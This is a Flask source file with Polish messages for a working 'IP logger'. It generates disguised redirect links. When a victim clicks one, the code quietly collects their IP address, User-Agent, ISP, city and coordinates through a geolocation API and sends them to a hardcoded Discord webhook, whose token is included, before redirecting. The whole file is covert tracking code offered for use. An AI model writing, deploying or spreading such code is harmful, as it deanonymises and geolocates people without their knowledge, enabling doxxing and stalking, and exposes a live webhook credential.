import os
import random
import string
from datetime import datetime
from flask import Flask, request, redirect, jsonify
import requests

app = Flask(__name__)
links_database = {}

WEBHOOK_URL = 'https://discord.com/api/webhooks/1508140013651624067/nMxvkUrDRE_0GyeZ15dPV_1DIJ04VGUlKlSQCgG6C61v0118dLK81ojbtovwab88Xcal'
SERVER_URL = 'https://server-mc.onrender.com'

def generate_random_id(length=6):
    characters = string.ascii_lowercase + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

@app.route('/generate', methods=['POST'])
def generate_link():
    data = request.get_json()
    if not data or 'originalUrl' not in data:
        return jsonify({"error": "Brak oryginalnego URL"}), 400
    
    original_url = data['originalUrl']
    link_id = generate_random_id()
    links_database[link_id] = original_url
    
    logger_url = f"{SERVER_URL}/redirect/{link_id}"
    return jsonify({"loggerUrl": logger_url})

@app.route('/redirect/<link_id>', methods=['GET'])
def redirect_to_url(link_id):
    original_url = links_database.get(link_id)
    if not original_url:
        return "Link nie istnieje lub wygasł.", 404

    user_agent = request.headers.get('User-Agent', 'Nieznany')
    user_ip = request.headers.get('X-Forwarded-For', '').split(',')[0].strip() or request.remote_addr

    geo_data = {
        "status": "fail", "country": "Nieznany", "regionName": "Nieznany",
        "city": "Nieznany", "isp": "Nieznany", "as": "Nieznany",
        "lat": 0, "lon": 0, "timezone": "Nieznany", "hosting": False
    }

    try:
        ip_to_check = '181.41.202.157' if user_ip in ['127.0.0.1', '::1'] else user_ip
        fields = "status,message,country,regionName,city,isp,as,lat,lon,timezone,hosting"
        geo_response = requests.get(f"http://ip-api.com/json/{ip_to_check}?fields={fields}", timeout=5)
        if geo_response.status_code == 200 and geo_response.json().get('status') == 'success':
            geo_data = geo_response.json()
    except Exception as e:
        print(f"Błąd GeoIP: {e}")

    discord_payload = {
        "embeds": [{
            "title": "🌐 Image Logger - IP Logged",
            "description": "**A User Opened the Original Link!**\n\n**Endpoint:** `/api/image`",
            "color": 1752220,
            "fields": [
                {
                    "name": "📌 IP Info:",
                    "value": (
                        f"**IP:** `{user_ip}`\n"
                        f"**Provider:** `{geo_data['isp']}`\n"
                        f"**ASN:** `{geo_data['as']}`\n"
                        f"**Country:** `{geo_data['country']}`\n"
                        f"**Region:** `{geo_data['regionName']}`\n"
                        f"**City:** `{geo_data['city']}`\n"
                        f"**Coords:** `{geo_data['lat']}, {geo_data['lon']}`\n"
                        f"**Timezone:** `{geo_data['timezone']}`\n"
                        f"**VPN/Hosting:** `{'True' if geo_data['hosting'] else 'False'}`\n"
                        f"**User-Agent:** `{user_agent[:100]}...`"
                    ),
                    "inline": False
                }
            ],
            "footer": {
                "text": f"Czas zdarzenia: {datetime.now().strftime('%d.%m.%Y, %H:%M:%S')}"
            }
        }]
    }

    try:
        requests.post(WEBHOOK_URL, json=discord_payload, timeout=5)
    except Exception as e:
        print(f"Błąd Webhooka: {e}")

    return redirect(original_url)

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
